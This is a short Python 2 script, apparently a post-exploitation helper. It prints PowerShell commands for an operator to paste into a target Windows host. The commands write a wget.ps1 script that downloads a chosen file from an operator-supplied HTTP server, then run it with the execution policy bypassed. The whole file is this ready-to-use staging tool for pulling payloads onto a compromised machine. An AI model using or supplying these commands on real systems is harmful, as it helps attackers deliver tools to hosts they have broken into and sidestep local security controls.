#! /usr/bin/python

import sys

if len(sys.argv) !=3:
    print "Usage: gen_ps1_wget.py <http_server> <file_to_download>"
    sys.exit(0)
print "\n"
print "Copy and paste the following in to the host:"
print "\n"
print "echo $storageDir = $pwd > wget.ps1"
print "echo $webclient = New-Object System.Net.WebClient >> wget.ps1"
print "echo $url = 'http://%s/%s' >> wget.ps1"%(sys.argv[1],sys.argv[2])
print "echo $file = '%s' >> wget.ps1" % sys.argv[2]
print "echo $webclient.DownloadFile($url,$file) >> wget.ps1"
print "\n"
print "Execute with:"
print "\n"
print "powershell.exe -ExecutionPolicy bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1"
